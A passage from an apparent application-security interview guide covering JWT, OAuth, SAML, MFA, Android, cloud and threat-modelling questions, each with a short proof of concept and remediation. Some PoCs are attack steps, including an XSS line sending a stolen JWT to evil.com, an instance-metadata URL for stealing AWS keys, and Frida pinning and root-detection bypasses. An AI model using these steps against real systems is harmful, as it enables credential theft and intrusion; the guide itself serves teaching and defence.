- **How it's exploited / PoC:** Register a domain that resolves to `127.0.0.1`/`169.254.169.254` (DNS rebinding) so it passes a naive hostname check, then have the "import" feature fetch it post-validation, reaching the internal target.
- **Remediation:** Resolve DNS yourself and validate the actual IP (not just the hostname string) against a blocked-ranges list immediately before each fetch, including on every redirect hop.

---

## SECTION 5 — Authentication & Authorization (JWT / OAuth / SAML / SSO)

### 51. AuthN vs AuthZ
`[Adapted format]`
- **What it is:** Authentication answers "who are you"; authorization answers "what are you allowed to do."
- **Approaches/Variants:** AuthN — passwords, MFA, biometrics, certificates. AuthZ — RBAC, ABAC, ACLs, scopes/claims.
- **Why it's asked:** The single most common real-world vulnerability class (BOLA) is a system that authenticates perfectly but never separately re-checks authorization.
- **How to structure your answer:** Give a concrete example distinguishing the two — "the token is 100% valid" (authentication succeeded) vs "should this valid token holder be allowed to do this specific thing to this specific resource" (authorization).
- **Best-practice takeaway:** Never let "authenticated" become a proxy for "authorized" in your own explanations or in code you review.

### 52. JWT Security Review Checklist
- **What it is:** The specific set of things to verify when reviewing JWT-based authentication.
- **Types:** Algorithm confirmation, expiry (`exp`) enforcement, revocation strategy, payload sensitivity, client-side storage location.
- **Why it is vulnerable:** JWTs are stateless by design (no built-in revocation) and their payload is base64-encoded, not encrypted — readable by anyone who intercepts the token.
- **How it's exploited / PoC:** Decode a captured JWT's payload (`base64 -d`) and find it contains internal role/PII data never meant to be client-visible, or find no `exp` claim at all — meaning a leaked token never expires.
- **Remediation:** Hard-code the expected signing algorithm server-side, enforce short expiry with a revocable refresh-token pattern, keep sensitive data out of the payload, and store tokens in httpOnly cookies rather than localStorage where feasible.

### 53. JWT alg:none / Key-Confusion Attacks
- **What it is:** Two classic JWT implementation bugs that let an attacker forge a validly-accepted token without knowing the signing key.
- **Types:** `alg: none` (server skips signature verification entirely), RS256-to-HS256 key-confusion (server accepts both algorithms and the attacker signs with the public key as if it were an HS256 shared secret).
- **Why it is vulnerable:** The verification code trusts the `alg` field from the attacker-controlled token header rather than enforcing one fixed, expected algorithm server-side.
- **How it's exploited / PoC:** Take a legitimate RS256 token, change the header to `{"alg":"HS256"}`, and sign it using the server's public key (which is, by definition, public) as the HMAC secret — a library that doesn't strictly separate algorithm families accepts it as valid.
- **Remediation:** Hard-code and pin exactly one expected algorithm in the verification call; never allow both symmetric and asymmetric algorithms on the same verification path; keep JWT libraries current.

### 54. JWT Storage: localStorage vs httpOnly Cookie
`[Adapted format]`
- **What it is:** Where the client persists a JWT between requests.
- **Approaches/Variants:** localStorage/sessionStorage (JS-accessible), httpOnly cookie (JS-inaccessible, browser auto-attaches it).
- **Why it's vulnerable:** localStorage is fully readable by any XSS on that origin — one stored XSS bug equals full token theft. httpOnly cookies defend against XSS-based theft but reopen CSRF as a concern since the browser auto-attaches them.
- **How it's exploited / PoC:** A stored XSS payload runs `fetch('https://evil.com?t='+localStorage.getItem('jwt'))`, exfiltrating the token with zero additional exploitation needed.
- **Remediation:** Prefer httpOnly, Secure, SameSite cookies for browser clients, paired with CSRF tokens for state-changing requests; if localStorage is unavoidable, invest heavily in XSS prevention (CSP, output encoding) as compensating controls.

### 55. OAuth2 Authorization Code + PKCE
- **What it is:** The standard OAuth2 flow for delegated access, extended with PKCE (Proof Key for Code Exchange) to protect public/mobile clients that can't safely store a client secret.
- **Types:** Authorization Code flow (confidential clients, server-side secret), Authorization Code + PKCE (public clients — SPAs, mobile apps), (legacy/deprecated: Implicit flow).
- **Why it is vulnerable without PKCE:** A malicious app on the same device can intercept the authorization code redirect (via a registered custom URI scheme) and exchange it for tokens itself, since public clients have no secret to prove they're the legitimate requester.
- **How it's exploited / PoC:** Without PKCE, a malicious app registers the same custom URL scheme as the legitimate app, intercepts the OAuth redirect containing the authorization code, and exchanges it at the token endpoint to obtain the victim's access token.
- **Remediation:** Always require PKCE for public clients — the client generates a `code_verifier`/`code_challenge` pair, and only the party holding the original verifier can successfully exchange the code for tokens, neutralizing the interception.

### 56. OAuth2 vs OIDC
`[Adapted format]`
- **What it is:** OAuth2 is an authorization framework (delegated access to resources); OpenID Connect (OIDC) is an identity/authentication layer built on top of OAuth2.
- **Approaches/Variants:** OAuth2 issues access tokens (for API access); OIDC additionally issues an ID token (a JWT proving who the user is, for login/authentication).
- **Why it's asked:** "Login with Google" is commonly (mis)called OAuth when it's actually OIDC — testing whether you know the distinction.
- **How to structure your answer:** OAuth2 = "can this app read my Google Drive files" (authorization); OIDC = "prove to this app who I am" (authentication) — OIDC reuses OAuth2's flows but adds the ID token and standardized user-info endpoint.
- **Best-practice takeaway:** Never use a bare OAuth2 access token as proof of identity — that's exactly the confusion OIDC was created to fix.

### 57. SAML SSO Flow
- **What it is:** An XML-based standard for exchanging authentication/authorization assertions between an Identity Provider (IdP) and a Service Provider (SP).
- **Types:** SP-initiated (user starts at the SP, gets redirected to the IdP to authenticate, then bounced back with an assertion), IdP-initiated (user starts at the IdP portal and is pushed to the SP with an assertion already in hand).
- **Why it is vulnerable [context]:** IdP-initiated flows are more susceptible to replay/CSRF-style abuse since there's no SP-generated `RelayState`/request context to correlate against, and XML signature validation is notoriously easy to implement incorrectly.
- **How it's exploited / PoC:** (see Q58 for the signature-wrapping PoC specifically).
- **Remediation:** Prefer SP-initiated flows where possible, validate the full assertion signature (not just a substring), enforce assertion expiry and audience restriction, and use a well-vetted SAML library rather than hand-rolled XML parsing.

### 58. SAML Signature-Wrapping Attack
- **What it is:** An XML Signature Wrapping (XSW) attack exploits the gap between which part of a SAML assertion is cryptographically signed and which part the application actually processes.
- **Types:** Several XSW variants differ in exactly where the attacker inserts a forged, unsigned copy of the assertion relative to the signed original in the XML document tree.
- **Why it is vulnerable:** The SP's XML parser processes a *different* element than the one the signature actually covers, so an attacker can insert a forged assertion (e.g., claiming to be an admin) alongside the original signed-but-unrelated assertion, and the app trusts the forged one.
- **How it's exploited / PoC:** Take a validly-signed SAML response, duplicate the `<Assertion>` element with modified attributes (different username/role), and reposition the original signed assertion elsewhere in the document — many vulnerable parsers validate the signature against the original but process the forged copy for actual login.
- **Remediation:** Use a mature, actively-maintained SAML library with a track record against XSW; validate that the *ID referenced by the signature* exactly matches the *ID of the assertion being processed*; canonicalize XML strictly before parsing.

### 59. SAML vs OAuth/OIDC — When to Recommend Which
`[Adapted format]`
- **What it is:** Two different standards solving overlapping but distinct problems (enterprise SSO vs delegated API access/modern web-mobile login).
- **Approaches/Variants:** SAML — XML-based, mature, dominant in enterprise/B2B SSO (especially with legacy IdPs like ADFS/Okta for corporate apps). OAuth2/OIDC — JSON/REST-based, lighter-weight, dominant for modern web/mobile/API-first apps and consumer login.
- **Why it's asked:** Tests practical client-advisory judgment, not just protocol trivia.
- **How to structure your answer:** Recommend SAML for enterprise B2B SSO integrating with an existing corporate IdP; recommend OIDC for consumer-facing or mobile-first applications and for anything that also needs delegated API access (OAuth2 scopes).
- **Best-practice takeaway:** Mention that many enterprise IdPs (Okta, Azure AD) support both — the choice is often driven by the target application's architecture, not the IdP's capability.

### 60. Token Replay
- **What it is:** Capturing a valid authentication/authorization token or assertion and reusing it later or from a different context.
- **Types:** SAML assertion replay, OAuth token replay, session-token replay (via network sniffing or logs).
- **Why it is vulnerable:** Tokens without a bound audience, a nonce, and a short/enforced expiry can be reused indefinitely by anyone who obtains them, regardless of who they were originally issued to.
- **How it's exploited / PoC:** Capture a SAML assertion in transit (e.g., over an insecure network or from a misconfigured log), and if the SP doesn't check the assertion's `NotOnOrAfter` time window or a used-once nonce, replay it to establish a new authenticated session.
- **Remediation:** Enforce short token lifetimes, validate `aud` (audience) claims strictly match the intended recipient, use one-time nonces and track consumed assertion IDs, and always transmit over TLS.

### 61. Secure Session Management
- **What it is:** Designing how a web app tracks an authenticated user's state across requests.
- **Types:** Cookie-based sessions (server-side state, session ID in cookie), token-based (JWT, client-side state) — each with distinct security considerations.
- **Why it is vulnerable if done poorly:** Predictable session IDs, missing cookie flags, and no session regeneration on login enable session fixation, hijacking, and CSRF.
- **How it's exploited / PoC:** Session fixation — attacker sets a known session ID on the victim (via a URL parameter or subdomain cookie) before login; once the victim authenticates, the app doesn't regenerate the session ID, so the attacker's known ID is now a valid authenticated session.
- **Remediation:** Regenerate the session ID on every privilege change (login, role escalation); set `Secure`, `HttpOnly`, `SameSite=Lax/Strict` on session cookies; enforce both idle and absolute session timeouts; invalidate server-side sessions on logout.

### 62. MFA Bypass Techniques
- **What it is:** Real-world weaknesses in MFA implementations that let an attacker complete authentication without possessing the second factor.
- **Types:** Response-manipulation bypass (client-side/API response tampering, e.g., changing `"mfa_required": true` to `false`), missing MFA enforcement on alternate endpoints (mobile API doesn't enforce MFA even though the web login does), OTP brute-force (no rate limiting on the OTP-verification endpoint), backup-code/recovery-flow weaknesses.
- **Why it is vulnerable:** MFA enforcement logic is often only checked in the primary web login flow and not consistently re-verified across every API entry point (mobile app, password-reset flow, admin panel).
- **How it's exploited / PoC:** Intercept the API response during login in Burp and flip a JSON flag like `"mfa_passed": false` to `true`, then continue to an authenticated session without ever supplying a valid OTP — works when the client (not the server) makes the final "is MFA satisfied" decision.
- **Remediation:** Enforce MFA state server-side as part of session-issuance logic (never trust a client-supplied flag), rate-limit and lock out OTP-verification attempts, and audit every authentication entry point (not just the primary login page) for consistent MFA enforcement.

### 63. Vertical vs Horizontal Privilege Escalation
- **What it is:** Vertical — a lower-privileged user gains higher-privilege capabilities (user → admin). Horizontal — a user accesses another user's data/functions at the same privilege level.
- **Types:** Vertical — role-parameter tampering, missing function-level checks (see BFLA, Q43). Horizontal — object-ID tampering (see BOLA, Q41/Q17).
- **Why it is vulnerable:** Both stem from the same root cause — the server trusts client-supplied identifiers/roles instead of independently verifying the authenticated user's actual entitlements for every request.
- **How it's exploited / PoC:** Vertical — change a hidden form field `role=user` to `role=admin` on a profile-update request and observe if the server actually grants admin privileges. Horizontal — swap another user's account/order ID into an otherwise identical authenticated request.
- **Remediation:** Never trust client-supplied role/permission fields; derive the user's role server-side from the authenticated session/token on every request; apply the same ownership/role checks tested systematically across every endpoint (see Q46).

---

## SECTION 6 — Android / Mobile Application Security

### 64. Android Testing Methodology
`[Adapted format]`
- **What it is:** Combined static and dynamic analysis of an Android app.
- **Approaches/Variants:** Static — decompile the APK, review manifest/permissions/code for hardcoded secrets and insecure logic. Dynamic — run the app with traffic intercepted through a proxy, observe runtime behavior, storage, and IPC.
- **Why it's asked:** Confirms you follow the OWASP MASTG-aligned methodology rather than only checking traffic.
- **How to structure your answer:** Static analysis first (map attack surface, find low-hanging fruit like hardcoded API keys) → dynamic analysis (proxy setup, runtime manipulation with Frida) → business-logic/API testing (treat the backend as its own target, per Section 4).
- **Best-practice takeaway:** Always test the backend APIs the app talks to with equal rigor — many "mobile" findings are really API findings surfaced through the app.

### 65. Proxying Android Traffic
`[Adapted format]`
- **What it is:** Configuring a device/emulator to route HTTP(S) traffic through an interception proxy for analysis.
- **Approaches/Variants:** Physical device on the same Wi-Fi as the proxy host, or an emulator (e.g., Genymotion) with proxy settings configured; install the proxy's CA certificate as a trusted user/system certificate on the device.
- **Why it's vulnerable if skipped by devs:** Many apps don't validate the server certificate properly, letting a proxy's self-signed CA be trusted and traffic decrypted, revealing API design and hidden endpoints.
- **How it's exploited / PoC:** Set Burp as the device's proxy, install Burp's CA cert into the device's trusted store (or via Frida/Magisk on newer Android versions that restrict user CAs for apps targeting API 24+), and observe full decrypted API traffic including auth headers and hidden parameters.
- **Remediation (developer-side):** Implement certificate/public-key pinning correctly (not just trusting any cert in the system store), and validate hostname/chain properly.

### 66. Certificate Pinning Bypass
- **What it is:** Circumventing an app's certificate-pinning implementation so intercepted TLS traffic is still trusted by the app.
- **Types:** Pinning via a hardcoded certificate/public-key hash, pinning via a trust-manager override, pinning via a third-party network library's config.
- **Why it is vulnerable (from a tester's need to bypass):** Pinning is a legitimate control, but testers need visibility into encrypted traffic to assess the API layer — bypass is a testing technique, not an attack in itself, though attackers use the same techniques maliciously.
- **How it's exploited / PoC:** Use Frida with a universal pinning-bypass script (e.g., `frida-multiple-unpinning`) or Objection's `android sslpinning disable` to hook and neutralize the app's certificate-validation logic at runtime, or statically patch the APK's smali code to remove the pinning check and re-sign it.
- **Remediation (developer-side):** Pin to a backup key as well as the primary (to survive cert rotation), combine pinning with root/tamper detection so a hooked/patched app is detected and can react (e.g., refuse to send sensitive data), and keep pinning logic obfuscated to raise the bar against static patching.

### 67. Static Analysis Artefacts
`[Adapted format]`
- **What it is:** The key files reviewed when statically analyzing an APK.
- **Approaches/Variants:** `AndroidManifest.xml` (permissions, exported components, `debuggable`/`allowBackup` flags), decompiled Java/Smali via `jadx`/`apktool` (hardcoded secrets, insecure logic, crypto misuse), `shared_prefs` XML files and local SQLite DBs (plaintext sensitive data), native libraries (`.so` files) for hardcoded keys.
- **Why it's asked:** Confirms hands-on familiarity with real mobile-pentest tooling, not just theory.
- **How to structure your answer:** Walk through your actual workflow — `jadx-gui` for readable Java, `grep` across decompiled source for API keys/secrets, manifest review for `android:exported="true"` components with no permission guard.
- **Best-practice takeaway:** Mention checking build variants — debug builds often leak far more (verbose logs, test endpoints, `debuggable=true`) than the production release.

### 68. Android Permission Model / Over-Privileged Apps
- **What it is:** Android's model of runtime and install-time permissions gating access to sensitive device resources and data.
- **Types:** Normal permissions (auto-granted), dangerous permissions (runtime user prompt, e.g., camera/location/contacts), signature permissions (only for apps signed by the same key).
- **Why it is vulnerable:** Apps frequently request far more dangerous permissions than their stated functionality needs ("permission creep"), expanding the data-exposure blast radius if the app is compromised or malicious.
- **How it's exploited / PoC:** Review the manifest of a simple utility app (e.g., a flashlight app) and find it requests `READ_CONTACTS`, `ACCESS_FINE_LOCATION`, and `READ_SMS` — permissions with no legitimate functional need, flaggable as a privacy/least-privilege finding.
- **Remediation:** Apply least-privilege permission requests, use scoped storage and one-time/foreground-only location access where possible, and justify every dangerous permission in the app's privacy documentation.

### 69. Insecure Data Storage
- **What it is:** Sensitive data stored on-device in a recoverable, unprotected form.
- **Types:** Plaintext SharedPreferences, unencrypted SQLite databases, sensitive data in application logs (`Log.d` calls left in production), sensitive data included in unencrypted device backups.
- **Why it is vulnerable:** Developers often assume the app sandbox alone is sufficient protection, ignoring that a rooted device, a backup extraction, or another app exploiting a misconfigured content provider can read this data directly.
- **How it's exploited / PoC:** Pull the app's data directory via `adb backup` or on a rooted device (`adb shell run-as com.target.app cat shared_prefs/auth.xml`) and find the user's auth token or password stored in cleartext.
- **Remediation:** Use Android's `EncryptedSharedPreferences`/Keystore-backed encryption for sensitive data at rest, set `android:allowBackup="false"` where appropriate, and strip verbose logging from release builds.

### 70. Insecure IPC (Exported Components / Intent Hijacking)
- **What it is:** Inter-process communication components (Activities, Services, Broadcast Receivers, Content Providers) exposed to other apps on the device without proper access control.
- **Types:** Exported Activity with no permission check (any app can launch a privileged screen), unprotected Broadcast Receiver (any app can send it a spoofed broadcast), unprotected Content Provider (any app can query/modify its backing data), implicit-intent hijacking (a malicious app registers to intercept an implicit intent meant for a legitimate app).
- **Why it is vulnerable:** A component marked `android:exported="true"` (explicitly, or implicitly via an intent-filter on some Android versions) with no `permission` attribute is callable by any other installed app.
- **How it's exploited / PoC:** A malicious app sends a crafted `Intent` directly to an exported Activity that handles a "reset password" or "admin login" screen, bypassing the app's own login flow entirely because the exported component assumed it would only ever be launched from within the legitimate app's own flow.
- **Remediation:** Set `android:exported="false"` for any component not genuinely meant for cross-app use; for those that must be exported, enforce a `permission` and validate the calling package/signature; never assume an implicit intent will only be received by the intended app.

### 71. Root/Jailbreak Detection Bypass
- **What it is:** App-side checks intended to detect a rooted device and refuse to run or restrict functionality (common in banking/fintech apps).
- **Types:** File-based checks (`su` binary, Magisk paths), build-property checks (`ro.debuggable`, `ro.build.tags=test-keys`), API-based checks (`RootBeer` library and similar).
- **Why it is vulnerable (from a tester's need to bypass):** Root detection is a legitimate control, but as with pinning, testers must bypass it to reach the app's actual business logic for a full assessment.
- **How it's exploited / PoC:** Use Frida to hook and force-return `false` from the app's root-check functions at runtime, use Magisk's "Hide" / Zygisk modules to conceal root artifacts from the app, or statically patch the detection logic out of the decompiled smali and re-sign the APK.
- **Remediation (developer-side):** Layer multiple independent detection techniques (no single bypass defeats them all), combine detection with server-side risk signals (device attestation via Play Integrity API) rather than relying purely on client-side checks the app itself could be tricked into misreporting.

---

## SECTION 7 — Cloud Security

### 72. Common Cloud Misconfigurations
- **What it is:** Insecure default or careless configuration of cloud resources that expose data or expand attack surface.
- **Types:** Publicly readable/writable storage buckets (S3/Blob/GCS), overly permissive security groups (`0.0.0.0/0` on sensitive ports), over-permissioned IAM roles/policies, unencrypted data at rest, disabled logging/monitoring (CloudTrail).
- **Why it is vulnerable:** Cloud consoles/IaC templates often default to permissive settings for ease of initial setup, and these defaults are frequently never hardened before production deployment.
- **How it's exploited / PoC:** Use a tool like `s3scanner` or manual bucket-name guessing to find a publicly-listable S3 bucket, then `aws s3 ls s3://bucket-name --no-sign-request` to enumerate and download sensitive files with no authentication at all.
- **Remediation:** Enforce private-by-default bucket policies with explicit exception review, use IaC security scanning (e.g., Checkov/tfsec) in CI/CD, apply least-privilege IAM continuously (not just at creation), and enable centralized logging/alerting on configuration drift.

### 73. Cloud SSRF via Instance Metadata
- **What it is:** SSRF (Q16) escalated specifically via the cloud instance metadata service, which by design hands out sensitive instance data (including temporary IAM credentials) to anything that can reach it from the instance's own network.
- **Types:** IMDSv1 (simple GET request, trivially reachable via basic SSRF), IMDSv2 (requires a session token obtained via a PUT request, which most simple SSRF payloads can't perform, raising the bar significantly).
- **Why it is vulnerable:** IMDSv1 has no authentication at all — any process (or SSRF'd request) that can reach `169.254.169.254` from the instance gets the data.
- **How it's exploited / PoC:** Via an SSRF vulnerability in the application, request `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` to retrieve live temporary AWS access keys, then use those keys with the AWS CLI to access other cloud resources the instance's role permits.
- **Remediation:** Enforce IMDSv2 (require the PUT-token step) at the instance/launch-template level, restrict outbound requests from application processes where possible, and fix the underlying SSRF (validate destination IPs, as in Q16).

### 74. Shared Responsibility Model
`[Adapted format]`
- **What it is:** The division of security ownership between the cloud provider and the customer.
- **Approaches/Variants:** IaaS — provider secures physical infrastructure/hypervisor, customer secures OS/network config/data/IAM/application. PaaS — provider additionally manages the OS/runtime, customer focuses on application/data/access config. SaaS — provider manages almost everything except data classification/access management/user behavior.
- **Why it's asked:** A huge share of real cloud breaches stem from customers assuming the provider "handles security" for things that are actually the customer's responsibility (e.g., S3 bucket policy is always the customer's job, regardless of service model).
- **How to structure your answer:** Give the concrete example — AWS secures the S3 service's underlying infrastructure; the customer is 100% responsible for the bucket's access policy.
- **Best-practice takeaway:** Frame client conversations around "here's specifically what's yours to secure" — this is a recurring finding-communication skill in cloud VAPT engagements.

### 75. IAM Least-Privilege Review
`[Adapted format]`
- **What it is:** Auditing IAM policies to ensure identities have only the permissions they actually need.
- **Approaches/Variants:** Manual policy JSON review, automated tools (AWS IAM Access Analyzer, Prowler, ScoutSuite), reviewing actual CloudTrail usage vs granted permissions to find unused/excessive grants.
- **Why it's vulnerable if skipped:** Wildcard actions/resources (`"Action":"*","Resource":"*"`) and unused-but-granted admin permissions dramatically expand the blast radius of any single compromised credential.
- **How it's exploited / PoC:** Find an EC2 instance role with `iam:PassRole` and `ec2:RunInstances` combined with a broad `s3:*` policy — an attacker who compromises the instance can launch a new instance with an even more privileged role and pivot to full account compromise (a classic privilege-escalation path).
- **Remediation:** Apply least privilege with resource-scoped, action-scoped policies; regularly right-size permissions based on actual CloudTrail usage; explicitly review and restrict privilege-escalation-prone permission combinations (`iam:PassRole`, `iam:CreatePolicyVersion`, etc.).

### 76. Security Group vs NACL (AWS)
- **What it is:** Two layers of network access control in AWS VPCs.
- **Types:** Security Groups (stateful, instance/ENI-level, allow-rules only), Network ACLs (stateless, subnet-level, both allow and deny rules, rule order matters).
- **Why it is vulnerable if misconfigured:** A security group open to `0.0.0.0/0` on a sensitive port (e.g., SSH/RDP/database ports) is directly internet-exploitable regardless of NACL settings, since NACLs are a secondary, coarser control most environments leave permissive.
- **How it's exploited / PoC:** Nmap-scan a target's public IP range, find port 3389/22 open to the world via an overly permissive security group, and attempt credential brute-force or exploit a known service vulnerability directly.
- **Remediation:** Restrict security groups to specific known source IP ranges (VPN/bastion only) for management ports; use NACLs as a defense-in-depth layer for subnet-wide deny rules; regularly audit for `0.0.0.0/0` rules on sensitive ports.

### 77. Threat Modelling Cloud-Native/Microservices Apps
`[Adapted format]`
- **What it is:** Adapting threat-modelling technique to the distributed, ephemeral, API-driven nature of cloud-native architectures.
- **Approaches/Variants:** Focus areas shift toward service-to-service authentication/authorization (mTLS, mesh policy), the CI/CD pipeline itself as an attack surface, secrets management, container/orchestration-layer risks (Kubernetes RBAC, pod security), and cloud IAM as the new network perimeter.
- **Why it's asked:** Tests whether your threat-modelling knowledge (STRIDE etc.) is genuinely adaptable, not just memorized for monolith web apps.
- **How to structure your answer:** Walk STRIDE across a microservices example — e.g., Spoofing (service identity via mTLS), Tampering (unsigned inter-service messages), Elevation of Privilege (overly broad service-to-service call permissions, as in the Q79 gRPC example).
- **Best-practice takeaway:** Emphasize that the trust boundary moves — it's no longer just "outside the network vs inside," but every service-to-service call needs its own boundary consideration.

### 78. mTLS Isn't Sufficient Authorization
- **What it is:** Mutual TLS provides strong service *identity verification* (both sides cryptographically prove who they are), but says nothing about what an identified service is actually *permitted* to do.
- **Types:** N/A — this is a conceptual gap, not a vulnerability type per se; manifests as Broken Function-Level Authorization (API5) at the service-to-service layer.
- **Why it is vulnerable:** Teams that deploy mTLS everywhere often stop there, treating "it's authenticated internal traffic" as equivalent to "it's trusted to do anything" — conflating authentication with authorization exactly as in Q51.
- **How it's exploited / PoC:** A `recommendation-service` with no legitimate business reason to touch billing successfully calls `billing-service`'s `VoidInvoice` RPC, because the mesh only verified its certificate identity — nothing checked whether that specific caller should be allowed to call that specific method.
- **Remediation:** Layer an explicit per-method, per-caller-identity authorization policy (allow-list/policy-as-code) on top of mTLS, derived from the verified certificate identity, enforced independently of the successful TLS handshake.

### 79. Securing Secrets in CI/CD and Cloud-Native Apps
`[Adapted format]`
- **What it is:** Protecting credentials (API keys, DB passwords, cloud access keys) used throughout the build/deploy pipeline and running application.
- **Approaches/Variants:** Dedicated secrets managers (HashiCorp Vault, AWS Secrets Manager/Parameter Store) with short-lived, dynamically-issued credentials, vs. anti-pattern of hardcoded secrets in source/env files/CI variables in plaintext.
- **Why it's vulnerable (anti-pattern):** Hardcoded or long-lived static secrets committed to source control or left in plaintext CI variables are routinely found via git history scanning, container image layer inspection, or CI log leakage.
- **How it's exploited / PoC:** Run a tool like `trufflehog`/`gitleaks` against a repository's full commit history (not just the latest commit) and find an AWS access key committed and later "removed" in a subsequent commit — still fully recoverable from history and often still valid/unrotated.
- **Remediation:** Never commit secrets to source control (pre-commit hooks + CI scanning as guardrails); use a secrets manager issuing short-lived, automatically-rotated credentials; scan git history retroactively and rotate any secret ever exposed, even if "removed" later.

---

## SECTION 8 — SDLC, Threat Modelling, SAST/DAST/SCA

### 80. Security in the SDLC
`[Adapted format]`
- **What it is:** Embedding security activities at every phase of the software development lifecycle rather than only at the end.
- **Approaches/Variants:** Requirements (security requirements/abuse cases), Design (threat modelling), Development (secure coding standards, SAST, peer review), Testing (DAST, manual pentest), Deployment (secure configuration, SCA for dependencies), Maintenance (patch management, continuous monitoring).
- **Why it's asked:** Tests whether you think of AppSec as a "shift-left" continuous discipline vs. a bolt-on pre-launch scan.
- **How to structure your answer:** Map one concrete activity to each SDLC phase and note that the cost of fixing a vulnerability rises sharply the later in the lifecycle it's found.
- **Best-practice takeaway:** Emphasize that threat modelling at the design phase catches architectural flaws that no amount of later-phase SAST/DAST scanning can find.

### 81. SAST vs DAST vs IAST vs SCA
- **What it is:** Four complementary categories of automated security testing tooling used across the SDLC.
- **Types:** SAST (Static — analyzes source/bytecode without executing it, catches code-level flaws early), DAST (Dynamic — tests the running application from the outside, like a black-box attacker, catches runtime/config issues), IAST (Interactive — instruments the running app during functional testing to combine visibility of both), SCA (Software Composition Analysis — scans dependencies/third-party libraries for known-vulnerable versions).
- **Why it is vulnerable [context — where each has blind spots]:** SAST misses runtime/config/environment issues and produces high false positives; DAST misses code it can't reach via crawling and can't pinpoint the exact vulnerable line; SCA only catches *known* CVEs in dependencies, not custom code flaws.
- **How it's exploited / PoC [Adapted]:** A CI pipeline running only SAST would completely miss a runtime misconfiguration like a missing security header or an exposed debug endpoint — that gap is exactly why DAST is run as a complementary layer, and vice versa for logic SAST catches that DAST's black-box crawling never reaches.
- **Remediation:** Run all four in a layered pipeline (SCA + SAST pre-merge, DAST/IAST in staging, periodic manual pentest for business-logic gaps none of the automated tools catch).

### 82. SAST vs SCA (specifically)
- **What it is:** SAST analyzes code you wrote for security flaws; SCA analyzes third-party/open-source dependencies you consumed for known vulnerabilities.
- **Types:** N/A.
- **Why it is vulnerable [context]:** Confusing the two leaves a gap — a clean SAST scan says nothing about a critical CVE in a vulnerable version of a logging library you imported (as in Log4Shell), and a clean SCA scan says nothing about a SQL injection bug in your own custom code.
- **How it's exploited / PoC [Adapted]:** An application passes SAST with zero findings (custom code is clean) but ships with a known-vulnerable version of a JSON-parsing library flagged by SCA — attackers target the CVE in the dependency, not the custom code, entirely bypassing what SAST was checking.
- **Remediation:** Run both, tracked as distinct pipeline gates, with SCA tied to an automated dependency-update/patch process (e.g., Dependabot/Renovate) rather than a manual periodic review.

### 83. STRIDE
- **What it is:** A threat-modelling mnemonic categorizing threats by the security property they violate.
- **Types:** **S**poofing (identity — e.g., forging another user's session), **T**ampering (data/integrity — e.g., modifying a request parameter in transit), **R**epudiation (denying an action — e.g., no audit log to prove who did what), **I**nformation Disclosure (confidentiality — e.g., verbose error leaking stack traces), **D**enial of Service (availability — e.g., an unthrottled endpoint enabling resource exhaustion), **E**levation of Privilege (authorization — e.g., a regular user reaching an admin function, as in BFLA).
- **Why it is vulnerable [context]:** Skipping STRIDE (or any structured model) during design leads to ad hoc, incomplete threat coverage that misses entire categories (teams often over-focus on Information Disclosure/Tampering and forget Repudiation/DoS).
- **How it's exploited / PoC [Adapted]:** Walk a login feature through all six categories in an interview to demonstrate you don't just default to "SQLi and XSS" — e.g., Repudiation: "is every login attempt logged with enough detail to investigate a dispute later?"
- **Remediation:** Apply STRIDE systematically per component/data-flow during design review, documenting mitigations for each identified threat before development starts.

### 84. DREAD & MITRE ATT&CK vs STRIDE
`[Adapted format]`
- **What it is:** Complementary frameworks operating at different stages/purposes than STRIDE.
- **Approaches/Variants:** STRIDE — identifies *what kinds* of threats exist (categorization). DREAD — scores/prioritizes identified threats (Damage, Reproducibility, Exploitability, Affected users, Discoverability). MITRE ATT&CK — a knowledge base of real-world adversary Tactics, Techniques & Procedures, used to validate coverage against actual attacker behavior (often used in red-team/detection-engineering context, less in pure design-phase threat modelling).
- **Why it's asked:** Tests whether you understand these solve different problems rather than being interchangeable "threat modelling frameworks."
- **How to structure your answer:** STRIDE to identify threats during design → DREAD (or a similar risk-scoring rubric) to prioritize which identified threats to address first → MITRE ATT&CK to sanity-check your control set against known real-world attacker TTPs, especially for security operations/detection use cases.
- **Best-practice takeaway:** Note that DREAD has fallen out of favor in some organizations for being too subjective — CVSS-style scoring is often used instead for consistency.

### 85. Threat-Modelling a Banking Web Application
`[Adapted format]`
- **What it is:** Applying threat modelling to a high-value, regulated financial application.
- **Approaches/Variants:** Data-flow diagram first (identify trust boundaries: internet → WAF/LB → app → DB → third-party payment gateway), then STRIDE per boundary crossing.
- **Why it's asked:** Tests whether you can prioritize correctly under a regulated, high-stakes context (PCI-DSS scope) rather than treating it like a generic app.
- **How to structure your answer:** Prioritize authentication (credential stuffing, MFA), authorization (fund-transfer ownership checks — BOLA equivalent), transaction integrity (tampering/replay of transaction requests), and PCI-scoped data flows (cardholder data storage/transmission) as the highest-priority trust boundaries.
- **Best-practice takeaway:** Explicitly mention compliance context (PCI-DSS, RBI guidelines if India-focused) — for a banking client, threat modelling output needs to map to a compliance framework, not just technical risk.

### 86. Threat Modelling in Agile
`[Adapted format]`
- **What it is:** Adapting a traditionally heavyweight, upfront activity to fit iterative sprint-based delivery.
- **Approaches/Variants:** Lightweight, incremental threat modelling per feature/story (only threat-model the *delta* being introduced) rather than a full-system re-model every sprint; maintain a living threat model document updated incrementally.
- **Why it's asked:** A common real objection from dev teams is "we don't have time for full threat modelling every sprint" — tests your practical judgment.
- **How to structure your answer:** Threat-model new features/significant architecture changes as part of story refinement (a lightweight checklist/questionnaire embedded in the Definition of Ready), reserving full-system threat modelling for major architectural shifts, not every sprint.
- **Best-practice takeaway:** Tie threat modelling triggers to specific events (new external integration, new data type handled, new trust boundary) rather than a fixed calendar cadence.

### 87. Prioritizing Noisy SAST Findings
`[Adapted format]`
- **What it is:** Triaging a large volume of SAST output, much of which is false-positive or low-impact, for a development team with limited remediation bandwidth.
- **Approaches/Variants:** Filter by rule confidence/severity, cross-reference with actual reachability (is the flagged code path actually reachable from untrusted input?), group by vulnerability class to fix systemically rather than one-by-one.
- **Why it's asked:** SAST tools are notorious for high false-positive rates; this tests practical remediation-management skill, not just running the scanner.
- **How to structure your answer:** Triage by (severity × exploitability/reachability), suppress/tune confirmed false positives at the tool config level (not just per-finding) to reduce future noise, and batch genuinely similar findings so developers fix the pattern once across the codebase.
- **Best-practice takeaway:** Mention integrating SAST as a PR-blocking gate only for high-confidence, high-severity rules — over-blocking on noisy rules trains developers to ignore the tool entirely.

### 88. Manual vs Automated Secure Code Review
`[Adapted format]`
- **What it is:** Comparing human-led code review against tool-driven static analysis for finding security flaws.
